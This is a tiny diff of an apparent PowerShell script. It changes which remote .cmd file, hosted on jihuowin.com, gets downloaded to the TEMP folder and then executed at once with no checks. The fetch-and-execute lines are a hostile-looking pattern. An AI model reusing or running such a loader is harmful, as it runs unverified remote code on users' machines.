@@ -1,4 +1,4 @@
-$seturl = "https://jihuowin.com/shell/chrome.cmd";
+$seturl = "https://jihuowin.com/shell/ltsc.cmd";
 
 Invoke-WebRequest -Uri $seturl -OutFile "$env:TEMP\tempfile.cmd";
 Start-Process -FilePath "$env:TEMP\tempfile.cmd";
